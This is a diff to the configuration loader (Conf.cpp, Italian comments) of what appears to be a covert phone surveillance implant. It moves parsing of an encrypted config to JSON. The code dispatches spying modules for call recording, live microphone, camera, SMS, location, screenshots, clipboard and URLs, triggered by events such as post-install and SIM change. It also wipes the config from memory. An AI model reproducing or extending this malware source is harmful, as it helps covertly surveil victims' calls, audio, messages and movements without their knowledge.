@@ -3,266 +3,294 @@
 #include "Status.h"
 #include "Encryption.h"
 #include "Log.h"
-
-#define STEP_AND_ASSIGN(p, delta, var) 	p += delta; \
-										CopyMemory(&var, p, sizeof(UINT));
-
-#define ASSIGN_AND_STEP(p, delta, var) 	CopyMemory(&var, p, sizeof(UINT)); \
-										p += delta;
-
-#define STEP(p, delta) 	p += delta;
+#include "Events.h"
+#include "Microphone.h"
+#include "RecordedCalls.h"
+#include "Modules.h"
 
 using namespace std;
 
-Conf::Conf() : encryptionObj(g_ConfKey, KEY_LEN) {
+Conf::Conf() : encryptionObj(g_ConfKey, KEY_LEN), jMod(NULL), jEv(NULL), jAct(NULL), jGlob(NULL) {
 	statusObj = Status::self();
 
 	strEncryptedConfName = g_ConfName;
 }
 
 Conf::~Conf(){
+	if (jMod)
+		delete jMod;
 
+	if (jEv)
+		delete jEv;
+
+	if (jAct)
+		delete jAct;
+
+	if (jGlob)
+		delete jGlob;
 }
 
-BOOL Conf::ParseAgent(BYTE **pAgent, UINT Num) {
-	AgentStruct cfgAgent, *ptr;
-	UINT  i;
-	BYTE *tmp = NULL;
+BOOL WINAPI Conf::ParseModule(JSONArray js) {
+	UINT i = 0;
+	ModulesManager *modulesManager = ModulesManager::self();
 
-	ZeroMemory(&cfgAgent, sizeof(AgentStruct));
+	for (i = 0; i < js.size(); i++) {
+		JSONObject jo = js[i]->AsObject();
+		JSONValue *c = jo[L"module"];
 
-	__try {
-		// Num = numero di Agenti
-		ptr = (pAgentStruct)(*pAgent);
-		for (i = 0; i < Num; i++) {
-			CopyMemory(&cfgAgent.uAgentId, &ptr->uAgentId, sizeof(UINT));
-
-			if ((cfgAgent.uAgentId & AGENT) != AGENT) {
-				DBG_TRACE(L"Debug - Conf.cpp - ParseAgent() invalid agent ID found\n", 1, FALSE);
-				return FALSE;
-			}
-
-			CopyMemory(&cfgAgent.uAgentStatus, &ptr->uAgentStatus, sizeof(UINT));
-			CopyMemory(&cfgAgent.uParamLength, &ptr->uParamLength, sizeof(UINT));
-
-			cfgAgent.pParams = NULL;
-			cfgAgent.pFunc = NULL;
-			cfgAgent.uCommand = 0;
-
-			if (cfgAgent.uParamLength) {
-				cfgAgent.pParams = new(std::nothrow) BYTE[cfgAgent.uParamLength];
-
-				if (cfgAgent.pParams == NULL)
-					return FALSE;
-
-				// Ci spostiamo sul buffer dati e copiamo la configurazione
-				tmp = (BYTE *)ptr;
-				tmp += (sizeof(UINT) * 3);
-				CopyMemory(cfgAgent.pParams, tmp, cfgAgent.uParamLength);
-				tmp += cfgAgent.uParamLength; // Puntiamo al prossimo agente/sezione/etc...
-			} else {
-				// Spostiamo avanti il puntatore della grandezza dei primi tre parametri
-				// della struttura
-				tmp = (BYTE *)ptr;
-				tmp += (sizeof(UINT) * 3);
-			}
-
-			ptr = (pAgentStruct)tmp;
-			statusObj->AddAgent(cfgAgent);
-
-			// Non liberiamo la memoria allocata perche' viene utilizzata da Status
+		if (c == NULL || c->IsString() == FALSE || c->AsString().empty() == TRUE) {
+			// WARNING
+			continue;
 		}
-		(*pAgent) = (BYTE *)ptr;
-	} __except (EXCEPTION_EXECUTE_HANDLER) {
-		DBG_TRACE(L"Debug - Conf.cpp - ParseAgent(), Exception Caught, invalid configuration\n", 1, FALSE);
-		return FALSE;
+
+		void* startProc = NULL;
+		wstring moduleName = c->AsString();
+
+#ifdef _DEBUG
+		wprintf(L"Parsing Module: %s\n", moduleName.c_str());
+#endif
+
+		do {
+			if (moduleName.compare(L"application") == 0 ) {
+				startProc = ApplicationModule;
+				break;
+			}
+
+			if (moduleName.compare(L"call") == 0 ) {
+				startProc = RecordedCalls;
+				break;
+			}
+
+			if (moduleName.compare(L"calllist") == 0 ) {
+				startProc = CallListAgent;
+				break;
+			}
+
+			if (moduleName.compare(L"camera") == 0 ) {
+				startProc = CameraModule;
+				break;
+			}
+
+			if (moduleName.compare(L"clipboard") == 0 ) {
+				startProc = ClipboardModule;
+				continue;
+			}
+
+			if (moduleName.compare(L"conference") == 0 ) {
+				startProc = CallAgent;
+				break;
+			}
+
+			if (moduleName.compare(L"crisis") == 0 ) {
+				startProc = CrisisModule;
+				break;
+			}
+
+			if (moduleName.compare(L"device") == 0 ) {
+				startProc = DeviceInfoAgent;
+				break;
+			}
+
+			if (moduleName.compare(L"livemic") == 0 ) {
+				startProc = LiveMicModule;
+				break;
+			}
+
+			if (moduleName.compare(L"messages") == 0 ) {
+				startProc = SmsAgent;
+				break;
+			}
+
+			if (moduleName.compare(L"mic") == 0 ) {
+				startProc = RecordedMicrophone;
+				break;
+			}
+
+			// AddressBook e calendar sono la stessa cosa
+			if (moduleName.compare(L"addressbook") == 0 ) {
+				startProc = CalendarModule;
+				break;
+			}
+
+			//if (moduleName.compare(L"calendar") == 0 ) {
+			//	startProc = OrganizerAgent;
+			//	break;
+			//}
+
+			if (moduleName.compare(L"position") == 0 ) {
+				startProc = PositionModule;
+				break;
+			}
+
+			if (moduleName.compare(L"snapshot") == 0 ) {
+				startProc = SnapshotModule;
+				break;
+			}
+
+			if (moduleName.compare(L"url") == 0 ) {
+				startProc = UrlModule;
+				break;
+			}
+		} while (0);
+
+		if (startProc != NULL)
+			modulesManager->add(moduleName, jo, startProc);
+
+		// startProc == NULL -> Unknown agent
 	}
 
 	return TRUE;
 }
 
-// Dopo gli eventi non esiste una sezione "azioni" perche' nel formato di
-// naga le azioni seguono subito gli eventi, percio' dobbiamo richiamare
-// direttamente la ParseActions() al ritorno da questa funzione...
-BOOL Conf::ParseEvent(BYTE **pEvent, UINT Num) {
-	EventStruct cfgEvent, *ptr;
-	UINT i;
-	BYTE *tmp = NULL;
+BOOL WINAPI Conf::ParseAction(JSONArray js) {
+	UINT i = 0;
+	ActionsManager *actionsManager = ActionsManager::self();
 
-	ZeroMemory(&cfgEvent, sizeof(EventStruct));
+	for (i = 0; i < js.size(); i++) {
+		JSONObject jo = js[i]->AsObject();
+		JSONValue *c = jo[L"subactions"];
 
-	__try {
-		// Num = numero di Eventi
-		ptr = (pEventStruct)(*pEvent);
-		for (i = 0; i < Num; i++) {
-			CopyMemory(&cfgEvent.uEventType, &ptr->uEventType, sizeof(UINT));
-
-			if ((cfgEvent.uEventType & EVENT) != EVENT) {
-				DBG_TRACE(L"Debug - Conf.cpp - ParseEvent() invalid event type found\n", 1, FALSE);
-				return FALSE;
-			}
-
-			CopyMemory(&cfgEvent.uActionId, &ptr->uActionId, sizeof(UINT));
-			CopyMemory(&cfgEvent.uParamLength, &ptr->uParamLength, sizeof(UINT));
-			cfgEvent.pParams = NULL;
-			cfgEvent.pFunc = NULL;
-			cfgEvent.uCommand = 0;
-			cfgEvent.uEventStatus = EVENT_STOPPED;
-
-			if (cfgEvent.uParamLength) {
-				cfgEvent.pParams = new(std::nothrow) BYTE[cfgEvent.uParamLength];
-
-				if (cfgEvent.pParams == NULL)
-					return FALSE;
-
-				// Ci spostiamo sul buffer dati e copiamo la configurazione
-				tmp = (BYTE *)ptr;
-				tmp += (sizeof(UINT) * 3);
-				CopyMemory(cfgEvent.pParams, tmp, cfgEvent.uParamLength);
-				tmp += cfgEvent.uParamLength; // Puntiamo al prossimo agente/sezione/etc...
-			} else {
-				// Spostiamo avanti il puntatore della grandezza dei primi parametri
-				// della struttura
-				tmp = (BYTE *)ptr;
-				tmp += (sizeof(UINT) * 3);
-			}
-
-			ptr = (pEventStruct)tmp;
-			statusObj->AddEvent(cfgEvent);
-
-			// Non liberiamo la memoria allocata perche' viene utilizzata da Status
+		if (c == NULL || c->IsArray() == FALSE) {
+			// WARNING
+			continue;
 		}
-		(*pEvent) = (BYTE *)ptr;
-	} __except (EXCEPTION_EXECUTE_HANDLER) {
-		DBG_TRACE(L"Debug - Conf.cpp - ParseEvent(), Exception Caught, invalid configuration\n", 1, FALSE);
-		return FALSE;
-	}
 
-	return TRUE; // Ora dobbiamo chiamare ParseAction()!!!
-}
+#ifdef _DEBUG
+		wstring moduleName = jo[L"desc"]->AsString();
+		wprintf(L"Parsing Action: \"%s\"\n", moduleName.c_str());
+#endif
+		wprintf(L"size: %d\n", c->AsArray().size());
 
-// Questa funzione passa il puntatore alla struttura che definisce una macro-azione
-BOOL Conf::ParseAction(BYTE **pAction, UINT Num) {
-	MacroActionStruct cfgAction;
-	pActionStruct ptr;
-	UINT i, j, dummy;
-	BYTE *tmp = NULL;
-
-	ZeroMemory(&cfgAction, sizeof(MacroActionStruct));
-
-	__try {
-		// Num = numero di macro-azioni
-		for (i = 0; i < Num; i++) {
-			// Leggi il numero di sotto-azioni per questa macro-azione
-			ASSIGN_AND_STEP(*pAction, sizeof(UINT), cfgAction.uSubActions)
-			cfgAction.pActions = new(std::nothrow) ActionStruct[cfgAction.uSubActions];
-
-			if (cfgAction.pActions == NULL)
-				return FALSE;
-
-			cfgAction.bTriggered = FALSE;
-			// Imposta tutte le sotto-azioni
-			ptr = (pActionStruct)(*pAction);
-			for (j = 0; j < cfgAction.uSubActions; j++) {
-				dummy = 0;
-
-				CopyMemory(&cfgAction.pActions[j].uActionType, &ptr->uActionType, sizeof(UINT));
-
-				if ((cfgAction.pActions[j].uActionType & ACTION) != ACTION) {
-					DBG_TRACE(L"Debug - Conf.cpp - ParseAction() invalid action found\n", 1, FALSE);
-					return FALSE;
-				}
-
-				CopyMemory(&cfgAction.pActions[j].uParamLength, &ptr->uParamLength, sizeof(UINT));
-				CopyMemory(&cfgAction.pActions[j].pParams, &dummy, sizeof(UINT));
-
-				if (cfgAction.pActions[j].uParamLength) {
-					cfgAction.pActions[j].pParams = new(std::nothrow) BYTE[cfgAction.pActions[j].uParamLength];
-
-					// XXX - Andrebbe fatto il cleanup se la new fallisce e sono gia' stati allocati
-					// degli elementi
-					if (cfgAction.pActions[j].pParams == NULL)
-						return FALSE;
-
-					// Ci spostiamo sul buffer dati e copiamo la configurazione
-					tmp = (BYTE *)ptr;
-					tmp += (sizeof(UINT) * 2);
-					CopyMemory(cfgAction.pActions[j].pParams, tmp, cfgAction.pActions[j].uParamLength);
-					tmp += cfgAction.pActions[j].uParamLength; // Puntiamo al prossimo agente/sezione/etc...
-				} else {
-					// Spostiamo avanti il puntatore della grandezza dei primi parametri
-					// della struttura.
-					tmp = (BYTE *)ptr;
-					tmp += (sizeof(UINT) * 2);
-				}
-
-				ptr = (pActionStruct)tmp;
-
-			}
-			(*pAction) = (BYTE *)ptr;
-
-			statusObj->AddAction(i, cfgAction);
-
-			// Non liberiamo la memoria allocata perche' viene utilizzata da Status
-		}
-	} __except (EXCEPTION_EXECUTE_HANDLER) {
-		DBG_TRACE(L"Debug - Conf.cpp - ParseAction(), Exception Caught, invalid configuration\n", 1, FALSE);
-		return FALSE;
+		actionsManager->add(i, c->AsArray());
 	}
 
 	return TRUE;
 }
 
-BOOL Conf::ParseConfiguration(BYTE **pConf, UINT Num) {
-	ConfStruct cfgConf, *ptr;
-	UINT i, dummy;
-	BYTE *tmp = NULL;
+BOOL WINAPI Conf::ParseEvent(JSONArray js) {
+	UINT i = 0;
+	EventsManager *eventsManager = EventsManager::self();
 
-	ZeroMemory(&cfgConf, sizeof(ConfStruct));
+	for (i = 0; i < js.size(); i++) {
+		JSONObject jo = js[i]->AsObject();
+		JSONValue *c = jo[L"event"];
 
-	__try {
-		// Num = numero di parametri di configurazione
-		ptr = (pConfStruct)(*pConf);
-		for (i = 0; i < Num; i++) {
-			dummy = 0;
-
-			CopyMemory(&cfgConf.uConfId, &ptr->uConfId, sizeof(UINT));
-
-			if ((cfgConf.uConfId & CONFIGURATION) != CONFIGURATION) {
-				DBG_TRACE(L"Debug - Conf.cpp - ParseConfiguration() invalid config option type found\n", 1, FALSE);
-				return FALSE;
-			}
-			
-			CopyMemory(&cfgConf.uParamLength, &ptr->uParamLength, sizeof(UINT));
-			CopyMemory(&cfgConf.pParams, &dummy, sizeof(UINT));
-
-			if (cfgConf.uParamLength) {
-				cfgConf.pParams = new(std::nothrow) BYTE[cfgConf.uParamLength];
-
-				if (cfgConf.pParams == NULL)
-					return FALSE;
-
-				// Ci spostiamo sul buffer dati e copiamo la configurazione
-				tmp = (BYTE *)ptr;
-				tmp += (sizeof(UINT) * 2);
-				CopyMemory(cfgConf.pParams, tmp, cfgConf.uParamLength);
-				tmp += cfgConf.uParamLength; // Puntiamo al prossimo evento/sezione/etc...
-			} else {
-				// Spostiamo avanti il puntatore della grandezza dei primi parametri
-				// della struttura
-				tmp = (BYTE *)ptr;
-				tmp += (sizeof(UINT) * 2);
-			}
-
-			ptr = (pConfStruct)tmp;
-			statusObj->AddConf(cfgConf);
-
-			// Non liberiamo la memoria allocata perche' viene utilizzata da Status
+		if (c == NULL || c->IsString() == FALSE || c->AsString().empty() == TRUE) {
+			// WARNING
+			continue;
 		}
-		(*pConf) = (BYTE *)ptr;
-	} __except (EXCEPTION_EXECUTE_HANDLER) {
-		DBG_TRACE(L"Debug - Conf.cpp - ParseConfiguration(), Exception Caught, invalid configuration\n", 1, FALSE);
+
+		void* startProc = NULL;
+		wstring eventName = c->AsString();
+
+#ifdef _DEBUG
+		wprintf(L"Parsing Event: %s\n", eventName.c_str());
+#endif
+
+		do {
+			if (eventName.compare(L"ac") == 0 ) {
+				startProc = OnAC;
+				break;
+			}
+
+			if (eventName.compare(L"battery") == 0 ) {
+				startProc = OnBatteryLevel;
+				break;
+			}
+
+			if (eventName.compare(L"call") == 0 ) {
+				startProc = OnCall;
+				break;
+			}
+
+			if (eventName.compare(L"connection") == 0 ) {
+				startProc = OnConnection;
+				break;
+			}
+
+			if (eventName.compare(L"position") == 0 ) {
+				startProc = OnLocation;
+				continue;
+			}
+
+			if (eventName.compare(L"process") == 0 ) {
+				startProc = OnProcess;
+				break;
+			}
+
+			if (eventName.compare(L"standby") == 0 ) {
+				startProc = OnStandby;
+				break;
+			}
+
+			if (eventName.compare(L"simchange") == 0 ) {
+				startProc = OnSimChange;
+				break;
+			}
+
+			if (eventName.compare(L"timer") == 0 ) {
+				startProc = OnTimer;
+				break;
+			}
+
+			if (eventName.compare(L"afterinst") == 0 ) {
+				startProc = OnAfterInst;
+				break;
+			}
+
+			if (eventName.compare(L"date") == 0 ) {
+				startProc = OnDate;
+				break;
+			}
+		} while (0);
+
+		if (startProc != NULL)
+			eventsManager->add(eventName, jo, startProc);
+
+		// startProc == NULL -> Unknown agent
+	}
+
+	return TRUE;
+}
+
+BOOL Conf::ParseGlobal(JSONArray js) {
+	wstring type;
+
+	type = L"quota";
+	//statusObj->AddGlobal(type, js[type]);
+
+	type = L"wipe";
+	//statusObj->AddGlobal(type, js[type]);
+
+	type = L"version";
+	//statusObj->AddGlobal(type, js[type]);
+
+	return TRUE;
+}
+
+BOOL Conf::ParseConfSection(JSONValue *jVal, char *conf, WCHAR *section, confCallback_t call_back) {
+	JSONObject root;
+
+	if (jVal) {
+		delete jVal;
+	}
+
+	jVal = JSON::Parse(conf);
+
+	if (!jVal)
 		return FALSE;
+
+	if (jVal->IsObject() == false) {
+		delete jVal;
+		jVal = NULL;
+
+		return FALSE;
+	}
+
+	root = jVal->AsObject();
+
+	if (root.find(section) != root.end() && root[section]->IsArray()) {
+		call_back(root[section]->AsArray());
 	}
 
 	return TRUE;
@@ -275,7 +303,6 @@ BOOL Conf::ParseConfiguration(BYTE **pConf, UINT Num) {
 BOOL Conf::LoadConf() {
 #define EXIT_ON_ERROR(x)	if(x == NULL){ delete[] pConf; return FALSE;}
 #define CLEAN_AND_EXIT(x)	delete[] pConf; return x;
-
 	BYTE *pConf = NULL, *pTemp = NULL;
 	wstring strBack;
 	UINT Len = 0, i = 0, num = 0;
@@ -288,7 +315,8 @@ BOOL Conf::LoadConf() {
 	strBack = GetBackupName(FALSE);
 
 	if (strBack.empty() == FALSE && FileExists(strBack)) {
-		pConf = encryptionObj.DecryptConf(strBack, &Len);
+		// XXX reimplementare
+		//pConf = encryptionObj.DecryptConfOld(strBack, &Len);
 
 		Log logInfo;
 
@@ -308,69 +336,31 @@ BOOL Conf::LoadConf() {
 
 	if (pConf == NULL || Len == 0)
 		return FALSE;
+	//
 
-	// pConf punta alla prima DWORD del blocco (lunghezza del file),
-	// ci spostiamo in modo da puntare al primo byte della configurazione
-	pTemp = pConf + 4;
+	ParseConfSection(jMod, (char *)pConf, L"modules", (confCallback_t)&Conf::ParseModule);
+	ParseConfSection(jEv, (char *)pConf, L"events", (confCallback_t)&Conf::ParseEvent);
+	ParseConfSection(jAct, (char *)pConf, L"actions", (confCallback_t)&Conf::ParseAction);
+	ParseConfSection(jGlob, (char *)pConf, L"globals", (confCallback_t)&Conf::ParseGlobal);
 
-	// Leggi la sezione relativa agli agenti
-	pTemp = MemStringCmp(pConf, AGENT_CONF_DELIMITER, Len);
-	EXIT_ON_ERROR(pTemp);
-
-	do {
-		ASSIGN_AND_STEP(pTemp, sizeof(UINT), num);
-		if (ParseAgent(&pTemp, num) == FALSE)
-			break;
-
-		// Leggi la sezione relativa agli eventi e poi le azioni
-		pTemp = MemStringCmp(pConf, EVENT_CONF_DELIMITER, Len);
-		EXIT_ON_ERROR(pTemp);
-
-		ASSIGN_AND_STEP(pTemp, sizeof(UINT), num);
-		if (ParseEvent(&pTemp, num) == FALSE)
-			break;
-
-		ASSIGN_AND_STEP(pTemp, sizeof(UINT), num);
-		if (ParseAction(&pTemp, num) == FALSE)
-			break;
-
-		// Leggi i parametri di configurazione
-		pTemp = MemStringCmp(pConf, MOBIL_CONF_DELIMITER, Len);
-		EXIT_ON_ERROR(pTemp);
-
-		ASSIGN_AND_STEP(pTemp, sizeof(UINT), num);
-		if (ParseConfiguration(&pTemp, num) == FALSE)
-			break;
-
-		// Spostiamo la conf di backup
-		if (bBackConf == FALSE) {
-			// Facciamo il wipe della memoria
-			ZeroMemory(pConf, Len);
-			CLEAN_AND_EXIT(TRUE);
-		}
-
-		wstring strBack, strPath;
-
-		strPath = GetCurrentPathStr(strEncryptedConfName);
-
-		if (strPath.empty())
-			break;
-		
-		strBack = GetBackupName(TRUE);
-
-		// Meglio essere paranoici
-		if (strBack.empty() == FALSE)
-			if (CopyFile(strBack.c_str(), strPath.c_str(), FALSE) == TRUE)
-				DeleteFile(strBack.c_str());
-
+	// Spostiamo la conf di backup
+	if (bBackConf == FALSE) {
 		// Facciamo il wipe della memoria
 		ZeroMemory(pConf, Len);
 		CLEAN_AND_EXIT(TRUE);
-	} while(0);
+	}
 
-	// Facciamo il wipe della memoria
-	ZeroMemory(pConf, Len);
-	CLEAN_AND_EXIT(FALSE);
+	wstring strPath;
+
+	strPath = GetCurrentPathStr(strEncryptedConfName);	
+	strBack = GetBackupName(TRUE);
+
+	// Meglio essere paranoici
+	if (strBack.empty() == FALSE)
+		if (CopyFile(strBack.c_str(), strPath.c_str(), FALSE) == TRUE)
+			DeleteFile(strBack.c_str());
+
+	return TRUE;
 }
 
 BOOL Conf::RemoveConf() {
